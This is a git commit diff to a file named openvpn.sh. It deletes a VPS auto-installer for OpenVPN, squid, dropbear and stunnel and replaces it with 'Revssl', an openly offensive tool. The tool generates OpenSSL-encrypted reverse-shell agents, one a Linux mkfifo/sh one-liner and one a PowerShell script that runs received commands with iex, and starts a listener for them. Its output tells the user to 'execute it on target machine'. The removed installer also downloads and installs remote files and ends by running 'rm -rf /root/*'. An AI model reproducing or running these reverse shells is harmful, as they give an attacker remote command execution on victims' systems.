0ad4547e38ca732c2173fe61bfeb7a4b695dbb4f
surinvpn <45985719+surinvpn@users.noreply.github.com>
2019-08-03 11:00:12 +0700

    Update openvpn.sh

--- openvpn.sh
+++ openvpn.sh
@@ -1,400 +1,160 @@
-#!/bin/sh
+#!/bin/bash
+red=`tput setaf 1`
+green=`tput setaf 2`
+yellow=`tput setaf 3`
+blue=`tput setaf 4`
+magenta=`tput setaf 5`
+grey=`tput setaf 8`
+reset=`tput sgr0`
+bold=`tput bold`
+underline=`tput smul`
 
-wget -O - https://swupdate.openvpn.net/repos/repo-public.gpg|apt-key add -
-sleep 2
-echo "deb http://build.openvpn.net/debian/openvpn/release/2.4 stretch main" > /etc/apt/sources.list.d/openvpn-aptrepo.list
-#Requirement
-apt install openvpn nginx php7.0-fpm stunnel4 squid3 dropbear easy-rsa vnstat ufw build-essential fail2ban dnsutils zip -y
+sun="${red}o${reset}${yellow}O${reset}"
 
-# initializing var
-MYIP=$(wget -qO- ipv4.icanhazip.com);
-if [ $MYIP = "" ]; then
-   MYIP=`ifconfig | grep 'inet addr:' | grep -v inet6 | grep -vE '127\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | cut -d: -f2 | awk '{ print $1}' | head -1`;
+print_good(){
+    echo "${green}[+]${reset}" $1
+}
+print_error(){
+    echo "${red}[x]${reset}" $1
+}
+print_info(){
+    echo "[*]" $1
+}
+
+listener=0
+agent_file=0
+remove_certs=0
+encryption="rsa:4096"
+lport=443
+days=365
+lhost=`ip address | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'`
+key_name="key.pem"
+cert_name="cert.pem"
+platform="linux"
+domain="whatsapp.com"
+agent_file_name="openssl_revshell"
+
+print_usage(){
+echo """		        _
+                       | |
+ _ __ _____   _____ ___| |
+| '__/ _ \ \ / / __/ __| |
+| | |  __/\ V /\__ \__ \ |
+|_|  \___| \_/ |___/___/_|
+"""
+echo "Revssl ver. 1.0"
+echo "Created by: TheSecondSun $sun"
+echo
+echo "usage: revssl [-h] [-i] [-e <encryption>] [-d <days>] [-l <lhost>]"
+echo "	      [-p <lport>] [-k <keyname>] [-c <certname>] [-p <platform>]"
+echo "	      [-o] [-n <outfile>] [-s <domain>] [-r]"
+echo "options:"
+echo " -h	Show help message"
+echo " -i	Initiate listener in OpenSSL"
+echo " -e <encryption>"
+echo "	Choose encryption type (default: $encryption)"
+echo " -d <days>"
+echo "	Set certificates lifetime"
+echo " -l <lhost>"
+echo "	Set listening host (default: $lhost)"
+echo " -p <port>"
+echo "	Set listening port (default: $lport)"
+echo " -k <keyname>"
+echo "	Set name of generated key file (default: $key_name)"
+echo " -c <certname>"
+echo "	Set name of generated cert file (default: $cert_name)"
+echo " -a <platform>"
+echo "	Select agent platform (windows or linux, default: $platform)"
+echo " -s <domain>"
+echo "	Domain name for Windows Powershell agent (default: $domain)"
+echo " -o	Write agent to a file"
+echo " -n <outfile>"
+echo "	Select name of the agent file (default: $agent_file_name)"
+echo " -r	Remove generated certificates after OpenSSH server is running"
+}
+
+while getopts "hie:p:l:d:a:on:r" opt; do
+    case "$opt" in
+    h)
+        print_usage
+        exit 0
+        ;;
+    i)  listener=1
+        ;;
+    e)  encryption=$OPTARG
+        ;;
+    d)  days=$OPTARG
+        ;;
+	l) lhost=$OPTARG
+		;;
+	p) lport=$OPTARG
+		;;
+	k) key_name=$OPTARG
+		;;
+	c) cert_name=$OPTARG
+		;;
+	a) platform=$OPTARG
+		;;
+	o) agent_file=1
+		;;
+	n) agent_file_name=$OPTARG
+		;;
+	r) remove_certs=1
+		;;
+    esac
+done
+
+shift $((OPTIND-1))
+[ "${1:-}" = "--" ] && shift
+
+gen_cert_cmd="openssl req -x509 -newkey $encryption -keyout $key_name -out $cert_name -days $days -nodes"
+
+listener_cmd="openssl s_server -quiet -key $key_name -cert $cert_name -port $lport"
+
+linux_agent="mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $lhost:$lport > /tmp/s; rm /tmp/s"
+
+read -r -d '' windows_agent << EOL
+\$socket = New-Object Net.Sockets.TcpClient('$lhost', $lport)
+\$stream = \$socket.GetStream()
+\$sslStream = New-Object System.Net.Security.SslStream(\$stream,\$false,({\$True} -as [Net.Security.RemoteCertificateValidationCallback]))
+\$sslStream.AuthenticateAsClient('$domain')
+\$writer = new-object System.IO.StreamWriter(\$sslStream)
+\$writer.Write('PS ' + (pwd).Path + '> ')
+\$writer.flush()
+[byte[]]\$bytes = 0..65535|%{0};
+while((\$i = \$sslStream.Read(\$bytes, 0, \$bytes.Length)) -ne 0)
+{\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);
+\$sendback = (iex \$data | Out-String ) 2>&1;
+\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';
+\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);
+\$sslStream.Write(\$sendbyte,0,\$sendbyte.Length);\$sslStream.Flush()}
+EOL
+
+$gen_cert_cmd
+echo
+print_info "Generated certificates"
+if [ "$platform" = "linux" ]; then
+	agent=$linux_agent
+else
+	agent=$windows_agent
 fi
-MYIP2="s/xxxxxxxxx/$MYIP/g";
-cd /root
-wget "https://raw.githubusercontent.com/jm051484/VPSauto/master/tool/plugin.tgz"
-wget "https://raw.githubusercontent.com/jm051484/VPSauto/master/tool/premiummenu.zip"
-
-# disable ipv6
-echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6
-
-# set time GMT +8
-ln -fs /usr/share/zoneinfo/Asia/Manila /etc/localtime
-
-# install webmin
-cd
-wget "https://raw.githubusercontent.com/jm051484/VPSauto/master/tool/webmin_1.801_all.deb"
-dpkg --install webmin_1.801_all.deb;
-apt-get -y -f install;
-sed -i 's/ssl=1/ssl=0/g' /etc/webmin/miniserv.conf
-rm /root/webmin_1.801_all.deb
-service webmin restart
-
-# install screenfetch
-cd
-wget -O /usr/bin/screenfetch "https://raw.githubusercontent.com/jm051484/VPSauto/master/tool/screenfetch"
-chmod +x /usr/bin/screenfetch
-echo "clear" >> .profile
-echo "screenfetch" >> .profile
-
-# setting port ssh
-sed -i 's/Port 22/Port 22/g' /etc/ssh/sshd_config
-sed -i '/Port 22/a Port 444' /etc/ssh/sshd_config
-
-# install dropbear
-sed -i 's/NO_START=1/NO_START=0/g' /etc/default/dropbear
-sed -i 's/DROPBEAR_PORT=22/DROPBEAR_PORT=3128/g' /etc/default/dropbear
-sed -i 's/DROPBEAR_EXTRA_ARGS=/DROPBEAR_EXTRA_ARGS="-p 143"/g' /etc/default/dropbear
-echo "/bin/false" >> /etc/shells
-
-# install squid3
-wget -O /etc/squid/squid.conf "https://raw.githubusercontent.com/jm051484/Deb83in1Autoscript/master/squid3.conf"
-sed -i $MYIP2 /etc/squid/squid.conf;
-
-# setting banner
-rm /etc/issue.net
-wget -O /etc/issue.net "https://raw.githubusercontent.com/jm051484/Deb83in1Autoscript/master/issue.net"
-sed -i 's@#Banner@Banner@g' /etc/ssh/sshd_config
-sed -i 's@DROPBEAR_BANNER=""@DROPBEAR_BANNER="/etc/issue.net"@g' /etc/default/dropbear
-
-# install OpenVPN
-cp -r /usr/share/easy-rsa/ /etc/openvpn
-mkdir /etc/openvpn/easy-rsa/keys
-
-# replace bits
-sed -i 's|export KEY_COUNTRY="US"|export KEY_COUNTRY="PH"|' /etc/openvpn/easy-rsa/vars
-sed -i 's|export KEY_PROVINCE="CA"|export KEY_PROVINCE="Camarines"|' /etc/openvpn/easy-rsa/vars
-sed -i 's|export KEY_CITY="SanFrancisco"|export KEY_CITY="Camarines"|' /etc/openvpn/easy-rsa/vars
-sed -i 's|export KEY_ORG="Fort-Funston"|export KEY_ORG="Personal"|' /etc/openvpn/easy-rsa/vars
-sed -i 's|export KEY_EMAIL="me@myhost.mydomain"|export KEY_EMAIL="jm051484@gmail.com"|' /etc/openvpn/easy-rsa/vars
-sed -i 's|export KEY_OU="MyOrganizationalUnit"|export KEY_OU="Personal"|' /etc/openvpn/easy-rsa/vars
-sed -i 's|export KEY_NAME="EasyRSA"|export KEY_NAME="jm051484"|' /etc/openvpn/easy-rsa/vars
-sed -i 's|export KEY_OU=changeme|export KEY_OU=jm051484|' /etc/openvpn/easy-rsa/vars
-
-#Create Diffie-Helman Pem
-openssl dhparam -out /etc/openvpn/dh2048.pem 2048
-
-# Create PKI
-cd /etc/openvpn/easy-rsa
-cp openssl-1.0.0.cnf openssl.cnf
-. ./vars
-./clean-all
-export EASY_RSA="${EASY_RSA:-.}"
-"$EASY_RSA/pkitool" --initca $*
-
-# create key server
-export EASY_RSA="${EASY_RSA:-.}"
-"$EASY_RSA/pkitool" --server server
-
-# setting KEY CN
-export EASY_RSA="${EASY_RSA:-.}"
-"$EASY_RSA/pkitool" client
-cd
-
-# cp /etc/openvpn/easy-rsa/keys/{server.crt,server.key} /etc/openvpn
-cp /etc/openvpn/easy-rsa/keys/server.crt /etc/openvpn/server.crt
-cp /etc/openvpn/easy-rsa/keys/server.key /etc/openvpn/server.key
-cp /etc/openvpn/easy-rsa/keys/ca.crt /etc/openvpn/ca.crt
-chmod +x /etc/openvpn/ca.crt
-
-# Setting Server
-tar -xzvf /root/plugin.tgz -C /usr/lib/openvpn/
-chmod +x /usr/lib/openvpn/*
-cat > /etc/openvpn/server.conf <<-END
-port 443
-proto tcp
-dev tun
-ca ca.crt
-cert server.crt
-key server.key
-dh dh2048.pem
-verify-client-cert none
-username-as-common-name
-plugin /usr/lib/openvpn/plugins/openvpn-plugin-auth-pam.so login
-server 192.168.100.0 255.255.255.0
-ifconfig-pool-persist ipp.txt
-push "redirect-gateway def1 bypass-dhcp"
-push "dhcp-option DNS 8.8.8.8"
-push "dhcp-option DNS 8.8.4.4"
-push "route-method exe"
-push "route-delay 2"
-socket-flags TCP_NODELAY
-push "socket-flags TCP_NODELAY"
-keepalive 10 120
-comp-lzo
-persist-key
-persist-tun
-status openvpn-status.log
-log openvpn.log
-verb 3
-ncp-disable
-cipher AES-256-CBC
-END
-systemctl start openvpn@server
-
-#Create OpenVPN Config
-mkdir -p /home/vps/public_html
-cat > /home/vps/public_html/client.ovpn <<-END
-
-# Created by jm051484
-client
-dev tun
-proto tcp
-remote $MYIP 443
-persist-key
-persist-tun
-pull
-resolv-retry infinite
-nobind
-comp-lzo
-remote-cert-tls server
-verb 3
-mute 2
-connect-retry 5 5
-connect-retry-max 8080
-mute-replay-warnings
-redirect-gateway def1
-script-security 2
-cipher AES-256-CBC
-auth-user-pass
-auth-nocache
-
-END
-echo '<ca>' >> /home/vps/public_html/client.ovpn
-cat /etc/openvpn/ca.crt >> /home/vps/public_html/client.ovpn
-echo '</ca>' >> /home/vps/public_html/client.ovpn
-
-cat > /home/vps/public_html/OpenVPN-Stunnel.ovpn <<-END
-
-# Created by jm051484
-client
-dev tun
-proto tcp
-remote 127.0.0.1 443
-route $MYIP 255.255.255.255 net_gateway
-persist-key
-persist-tun
-pull
-resolv-retry infinite
-nobind
-comp-lzo
-remote-cert-tls server
-verb 3
-mute 2
-connect-retry 5 5
-connect-retry-max 8080
-mute-replay-warnings
-redirect-gateway def1
-script-security 2
-cipher AES-256-CBC
-auth-user-pass
-auth-nocache
-
-END
-echo '<ca>' >> /home/vps/public_html/OpenVPN-Stunnel.ovpn
-cat /etc/openvpn/ca.crt >> /home/vps/public_html/OpenVPN-Stunnel.ovpn
-echo '</ca>' >> /home/vps/public_html/OpenVPN-Stunnel.ovpn
-
-cat > /home/vps/public_html/stunnel.conf <<-END
-
-client = yes
-debug = 6
-
-[openvpn]
-accept = 127.0.0.1:443
-connect = $MYIP:80
-[squid1]
-accept = 127.0.0.1:8000
-connect = $MYIP:8020
-[squid2]
-accept = 127.0.0.1:8080
-connect = $MYIP:8020
-TIMEOUTclose = 0
-verify = 0
-sni = t.co
-END
-
-# Configure Stunnel
-sed -i 's/ENABLED=0/ENABLED=1/g' /etc/default/stunnel4
-openssl req -new -newkey rsa:2048 -days 3650 -nodes -x509 -sha256 -subj '/CN=127.0.0.1/O=localhost/C=PH' -keyout /etc/stunnel/stunnel.pem -out /etc/stunnel/stunnel.pem
-cat > /etc/stunnel/stunnel.conf <<-END
-
-sslVersion = all
-pid = /stunnel.pid
-socket = l:TCP_NODELAY=1
-socket = r:TCP_NODELAY=1
-client = no
-
-[squid1]
-accept = 8020
-connect = 127.0.0.1:8000
-
-[squid2]
-accept = 8020
-connect = 127.0.0.1:8080
-
-[openvpn]
-accept = 80
-connect = 127.0.0.1:443
-cert = /etc/stunnel/stunnel.pem
-
-[ssh]
-accept = 442
-connect = 127.0.0.1:22
-cert = /etc/stunnel/stunnel.pem
-
-END
-
-#Setting UFW
-ufw allow ssh
-ufw allow 443/tcp
-sed -i 's|DEFAULT_INPUT_POLICY="DROP"|DEFAULT_INPUT_POLICY="ACCEPT"|' /etc/default/ufw
-sed -i 's|DEFAULT_FORWARD_POLICY="DROP"|DEFAULT_FORWARD_POLICY="ACCEPT"|' /etc/default/ufw
-
-# set ipv4 forward
-echo 1 > /proc/sys/net/ipv4/ip_forward
-sed -i 's|#net.ipv4.ip_forward=1|net.ipv4.ip_forward=1|' /etc/sysctl.conf
-
-#Setting IPtables
-cat > /etc/iptables.up.rules <<-END
-*nat
-:PREROUTING ACCEPT [0:0]
-:OUTPUT ACCEPT [0:0]
-:POSTROUTING ACCEPT [0:0]
--A POSTROUTING -j SNAT --to-source xxxxxxxxx
--A POSTROUTING -o eth0 -j MASQUERADE
--A POSTROUTING -s 192.168.100.0/24 -o eth0 -j MASQUERADE
-COMMIT
-*filter
-:INPUT ACCEPT [0:0]
-:FORWARD ACCEPT [0:0]
-:OUTPUT ACCEPT [0:0]
-:fail2ban-ssh - [0:0]
--A INPUT -p tcp -m multiport --dports 22 -j fail2ban-ssh
--A INPUT -p ICMP --icmp-type 8 -j ACCEPT
--A INPUT -p tcp -m tcp --dport 53 -j ACCEPT
--A INPUT -p tcp --dport 22  -m state --state NEW -j ACCEPT
--A INPUT -p tcp --dport 80  -m state --state NEW -j ACCEPT
--A INPUT -p tcp --dport 143  -m state --state NEW -j ACCEPT
--A INPUT -p tcp --dport 441  -m state --state NEW -j ACCEPT
--A INPUT -p tcp --dport 442  -m state --state NEW -j ACCEPT
--A INPUT -p tcp --dport 443  -m state --state NEW -j ACCEPT
--A INPUT -p tcp --dport 587  -m state --state NEW -j ACCEPT
--A INPUT -p tcp --dport 1147  -m state --state NEW -j ACCEPT
--A INPUT -p udp --dport 1147  -m state --state NEW -j ACCEPT
--A INPUT -p tcp --dport 1193  -m state --state NEW -j ACCEPT
--A INPUT -p udp --dport 1193  -m state --state NEW -j ACCEPT
--A INPUT -p tcp --dport 3128  -m state --state NEW -j ACCEPT
--A INPUT -p udp --dport 3128  -m state --state NEW -j ACCEPT
--A INPUT -p tcp --dport 8080  -m state --state NEW -j ACCEPT
--A INPUT -p udp --dport 8080  -m state --state NEW -j ACCEPT 
--A INPUT -p tcp --dport 10000  -m state --state NEW -j ACCEPT
--A fail2ban-ssh -j RETURN
-COMMIT
-*raw
-:PREROUTING ACCEPT [0:0]
-:OUTPUT ACCEPT [0:0]
-COMMIT
-*mangle
-:PREROUTING ACCEPT [0:0]
-:INPUT ACCEPT [0:0]
-:FORWARD ACCEPT [0:0]
-:OUTPUT ACCEPT [0:0]
-:POSTROUTING ACCEPT [0:0]
-COMMIT
-END
-sed -i $MYIP2 /etc/iptables.up.rules;
-iptables-restore < /etc/iptables.up.rules
-
-# Configure Nginx
-sed -i 's/\/var\/www\/html;/\/home\/vps\/public_html\/;/g' /etc/nginx/sites-enabled/default
-cp /var/www/html/index.nginx-debian.html /home/vps/public_html/index.html
-
-# Create and Configure rc.local
-cat > /etc/rc.local <<-END
-#!/bin/sh -e
-
-exit 0
-END
-chmod +x /etc/rc.local
-sed -i '$ i\echo "nameserver 8.8.8.8" > /etc/resolv.conf' /etc/rc.local
-sed -i '$ i\echo "nameserver 8.8.4.4" >> /etc/resolv.conf' /etc/rc.local
-sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
-
-# Configure menu
-apt-get install unzip
-cd /usr/local/bin/
-wget "https://raw.githubusercontent.com/jm051484/VPSauto/master/tool/premiummenu.zip" 
-unzip premiummenu.zip
-chmod +x /usr/local/bin/*
-
-# add eth0 to vnstat
-vnstat -u -i eth0
-
-# compress configs
-cd /home/vps/public_html
-zip configs.zip client.ovpn OpenVPN-Stunnel.ovpn stunnel.conf
-
-# install libxml-parser
-apt-get install -y libxml-parser-perl
-
-# finalizing
-vnstat -u -i eth0
-apt-get -y autoremove
-chown -R www-data:www-data /home/vps/public_html
-service nginx start
-service php7.0-fpm start
-service vnstat restart
-service openvpn restart
-service ssh restart
-service dropbear restart
-service fail2ban restart
-service squid restart
-
-#clearing history
-history -c
-rm -rf /root/*
-cd /root
-# info
-clear
-echo " "
-echo "Installation has been completed!!"
-echo "DEVICE WILL REBOOT IN 10 SECONDS"
-echo "PLEASE WAIT PATIENTLY AND RELOGIN TO YOUR VPS"
-echo " "
-echo "--------------------------- Configuration Setup Server -------------------------"
-echo "                         Copyright HostingTermurah.net                          "
-echo "                                Modified by jm051484                        "
-echo "--------------------------------------------------------------------------------"
-echo ""  | tee -a log-install.txt
-echo "Server Information"  | tee -a log-install.txt
-echo "   - Timezone    : Asia/Manila (GMT +8)"  | tee -a log-install.txt
-echo "   - Fail2Ban    : [ON]"  | tee -a log-install.txt
-echo "   - IPtables    : [ON]"  | tee -a log-install.txt
-echo "   - Auto-Reboot : [OFF]"  | tee -a log-install.txt
-echo "   - IPv6        : [OFF]"  | tee -a log-install.txt
-echo ""  | tee -a log-install.txt
-echo "Application & Port Information"  | tee -a log-install.txt
-echo "   - OpenVPN		: TCP 443"  | tee -a log-install.txt
-echo "   - OpenVPN-Stunnel	: 80"  | tee -a log-install.txt
-echo "   - OpenSSH  : 22, 444"  | tee -a log-install.txt
-echo "   - Dropbear		: 143, 3128"  | tee -a log-install.txt
-echo "   - Stunnel	: 442"  | tee -a log-install.txt
-echo "   - Squid Proxy	: 8000, 8080 (limit to IP Server)"  | tee -a log-install.txt
-echo "   - Nginx		: 80"  | tee -a log-install.txt
-echo ""  | tee -a log-install.txt
-echo ""  | tee -a log-install.txt
-echo "Premium Script Information"  | tee -a log-install.txt
-echo "   To display list of commands: menu"  | tee -a log-install.txt
-echo ""  | tee -a log-install.txt
-echo ""  | tee -a log-install.txt
-echo "Important Information"  | tee -a log-install.txt
-echo "   - Download Config OpenVPN : http://$MYIP/configs.zip"  | tee -a log-install.txt
-echo "   - Installation Log        : cat /root/log-install.txt"  | tee -a log-install.txt
-echo ""  | tee -a log-install.txt
-echo "   - Webmin                  : http://$MYIP:10000/"  | tee -a log-install.txt
-echo ""
-echo "------------------------------ Modified by jm051484 -----------------------------"
-echo "-----Please Reboot your VPS -----"
-sleep 5
+print_info "Generated agent for $platform (execute it on target machine):"
+echo "$agent"
+echo
+remove_certs() {
+    sleep 10
+    if [ $remove_certs -eq 1 ]; then
+	rm $cert_name
+	rm $key_name
+	print_info "Removed keys and certificates"
+    fi
+}
+remove_certs &
+if [ $agent_file -eq 1 ]; then
+	echo "$agent" > $agent_file_name
+	print_info "Saved agent to $bold$agent_file_name$reset"
+fi
+if [ $listener -eq 1 ]; then
+	print_good "Started listener on port $lport"
+	$listener_cmd
+fi
